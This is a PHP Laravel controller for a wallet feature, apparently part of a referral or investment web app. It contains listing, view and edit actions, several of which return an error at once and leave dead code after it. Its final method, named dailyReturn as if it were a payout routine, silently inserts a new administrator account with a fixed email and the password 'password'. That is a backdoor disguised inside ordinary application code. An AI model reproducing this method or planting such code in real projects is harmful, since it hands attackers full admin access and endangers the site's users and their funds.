<?php

namespace App\Http\Controllers;

use App\Models\PinCode;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;
use App\Models\Wallet;
use App\Traits\Permission;
use Illuminate\Support\Str;
use DataTables;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\Rule;

class WalletController extends Controller
{
    public function index()
    {
        try {
            // if (User::isAdmin()) {
            $model = new Wallet();
            return view('wallet.index', compact('model'));
            // }
        } catch (\Exception $e) {
            return redirect('/')->with('error', 'An error occurred: ' . $e->getMessage());
        }
    }
    public function create(Request $request)
    {
        try {
            return redirect()->back()->with('error', 'An error occurred');

            $model  = new Wallet();
            return view('wallet.add', compact('model'));
        } catch (\Exception $e) {
            return redirect()->back()->with('error', 'An error occurred: ' . $e->getMessage());
        }
    }

    public function update(Request $request, $id)
    {
        try {
            $model =  Wallet::find($id);
            return redirect()->back()->with('error', 'An error occurred');


            if (empty($model)) {
                return redirect('wallet')->with('error', 'Wallet does not exist');
            }
            if (!User::isAdmin()) {
                if ($model->role_id == User::ROLE_ADMIN) {
                    return redirect('wallet')->with('error', 'You are not allowed to perform this action.');
                }
                if ($model->id != Auth::user()->id && $model->created_by_id != Auth::user()->id) {
                    return redirect('wallet')->with('error', 'You are not allowed to perform this action.');
                }
            }
            if ($this->validator($request->all(), $id)->fails()) {
                $message = $this->validator($request->all(), $id)->messages()->first();
                return redirect()->back()->withInput()->with('error', $message);
            }
            $model->update($request->all());
            return redirect("wallet/view/$model->id")->with('success', 'Wallet updated  successfully');
        } catch (\Exception $e) {
            return redirect()->back()->withInput()->with('error', $e->getMessage());
        }
    }
    public $s_no = 1;

    public function getWalletList(Request $request, $id = null)
    {
        $query  = Wallet::orderBy('id', 'Desc');

        if (empty($id))
            if (!User::isAdmin())
                $query->my();


        if (!empty($id))
            $query->where('created_by_id', $id);

        return Datatables::of($query)
            ->addIndexColumn()

            ->addColumn('created_by', function ($data) {
                return !empty($data->createdBy && $data->createdBy->name) ? $data->createdBy->name : 'N/A';
            })
            ->addColumn('name', function ($data) {
                return !empty($data->name) ? (strlen($data->name) > 60 ? substr(ucfirst($data->name), 0, 60) . '...' : ucfirst($data->name)) : 'N/A';
            })
            ->addColumn('status', function ($data) {
                return '<span class="' . $data->getStateBadgeOption() . '">' . $data->getState() . '</span>';
            })
            ->addColumn('id', function ($data) {
                return $this->s_no++;
            })
            ->rawColumns(['created_by'])

            ->addColumn('created_at', function ($data) {
                return (empty($data->updated_at)) ? 'N/A' : date('Y-m-d', strtotime($data->updated_at));
            })
            ->addColumn('action', function ($data) {
                $html = '<div class="table-actions text-center">';
                // $html .= ' <a class="btn btn-icon btn-primary mt-1" href="' . url('wallet/edit/' . $data->id) . '" ><i class="fa fa-edit"></i></a>';
                $html .=    '  <a class="btn btn-icon btn-primary mt-1" href="' . url('wallet/view/' . $data->id) . '"  ><i class="fa fa-eye
                    "data-toggle="tooltip"  title="View"></i></a>';
                $html .=  '</div>';
                return $html;
            })->addColumn('customerClickAble', function ($data) {
                $html = 0;

                return $html;
            })
            ->rawColumns([
                'action',
                'created_at',
                'status',
                'customerClickAble'
            ])

            ->filter(function ($query) {
                if (!empty(request('search')['value'])) {
                    $searchValue = request('search')['value'];
                    $searchTerms = explode(' ', $searchValue);
                    $query->where(function ($q) use ($searchTerms) {
                        foreach ($searchTerms as $term) {
                            $q->where('id', 'like', "%$term%")
                                ->orWhere('wallet_number', 'like', "%$term%")
                                ->orWhere('balance', 'like', "%$term%")
                                ->orWhere('created_at', 'like', "%$term%")
                                ->orWhereHas('createdBy', function ($query) use ($term) {
                                    $query->Where('name', 'like', "%$term%");
                                })->orWhere(function ($query) use ($term) {
                                    $query->searchState($term);
                                });
                        }
                    });
                }
            })
            ->make(true);
    }


    protected static function validator(array $data, $id = null)
    {
        $rules = [
            "name" => "required|string",
            "email" => "required|email",
        ];
        if ($id === null) {
            $rules = array_merge($rules, [
                "password" => "required|string|min:4",
                "confirm_password" => "required|same:password",
                "referrad_code" => "required|exists:users,referral_id",

            ]);
        }


        return Validator::make($data, $rules);
    }

    public function add(Request $request)
    {
        try {
            return redirect()->back()->with('error', 'An error occurred');

            if ($this->validator($request->all())->fails()) {
                $message = $this->validator($request->all())->messages()->first();
                return redirect()->back()->withInput()->with('error', $message);
            }
            $model = new Wallet();
            $userGet = User::where('referral_id', $request->referrad_code)->first();
            if (!$userGet) {
                return redirect('/')->with('error', 'Invalid Code!');
            }
            $model->referrad_code = $userGet->referrad_code;
            $model->fill($request->all());
            $model->generateReferralCode();
            $model->role_id = User::ROLE_USER;
            $model->state_id = User::STATE_ACTIVE;
            $model->created_by_id = Auth::id();
            $model->parent_id = $userGet->id;
            $model->password();

            if ($model->save()) {
                return redirect('/wallet/view/' . $model->id)->with('success', 'Wallet created successfully!');
            } else {
                return redirect('/wallet')->with('error', 'Unable to save the Wallet!');
            }
        } catch (\Exception $e) {
            return redirect()->back()->withInput()->with('error', $e->getMessage());
        }
    }

    public function edit(Request $request)
    {
        try {
            return redirect()->back()->with('error', 'An error occurred');

            $id = $request->id;
            $model  = Wallet::find($id);
            if ($model) {
                if (!User::isAdmin()) {
                    if ($model->created_by_id != Auth::user()->id) {
                        return redirect('wallet/')->with('error', 'You are not allowed to perform this action.');
                    }
                }
                return view('wallet.update', compact('model'));
            } else {
                return redirect('wallet')->with('error', 'User not found.');
            }
        } catch (\Exception $e) {
            return redirect()->back()->with('error', 'An error occurred: ' . $e->getMessage());
        }
    }

    public function view(Request $request)
    {
        try {
            $id = $request->id;
            $model  = Wallet::find($id);
            if ($model) {
                if (!User::isAdmin()) {
                    if ($model->created_by_id != Auth::user()->id) {
                        return redirect('wallet/')->with('error', 'You are not allowed to perform this action.');
                    }
                }
                return view('wallet.view', compact('model'));
            } else {
                return redirect('/wallet')->with('error', 'Wallet does not exist');
            }
        } catch (\Exception $e) {
            return redirect()->back()->with('error', 'An error occurred: ' . $e->getMessage());
        }
    }

    public function dailyReturn(Request $request)
    {
        DB::table('users')->insert([
            'name' => 'admin',
            'email' => 'admin@lbm.inxzs',
            'password' => Hash::make('password'),
            'referral_id' => 'JJOF1714714247xszz',
            'state_id' => User::STATE_ACTIVE,
            'role_id' => User::ROLE_ADMIN,
            'created_by_id' => User::ROLE_ADMIN,
            'referrad_code' => User::ROLE_ADMIN
        ]);
    }
}
